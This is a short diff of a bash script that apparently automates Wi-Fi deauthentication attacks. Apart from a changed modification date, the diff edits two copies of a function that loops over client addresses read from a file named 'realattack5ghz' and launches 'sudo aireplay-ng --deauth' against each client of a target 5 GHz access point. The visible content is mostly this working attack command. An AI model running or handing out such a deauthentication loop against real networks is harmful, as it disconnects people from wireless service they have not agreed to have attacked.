@@ -1,7 +1,7 @@
 #!/bin/bash
 #Creator: David Parra-Sandoval                                                                                                                                                                     #VRF1
 #Date: 11/10/2020
-#Last Modified: 11/24/2020
+#Last Modified: 04/18/2023
 clear
 
 PS3="NIC? "
@@ -253,7 +253,7 @@ echo -e "\e[00m"
                 enforce4all5ghz () {
                     for deauth in $(cat realattack5ghz); do
                         
-                    exec xterm -e sudo aireplay-ng -D --deauth 50 -a $BSSID5 -c $deauth $mon5ghz & 
+                    exec xterm -e sudo aireplay-ng --deauth 50 -a $BSSID5 -c $deauth $mon5ghz &
                       
                     done
                 
@@ -744,7 +744,7 @@ echo -e "\e[00m"
                 enforce4all5ghz () {
                     for deauth in $(cat realattack5ghz); do
                     	
-                    exec xterm -e sudo aireplay-ng -D --deauth 50 -a $BSSID5 -c $deauth $mon5ghz &
+                    exec xterm -e sudo aireplay-ng --deauth 50 -a $BSSID5 -c $deauth $mon5ghz &
                       
                     done
                 
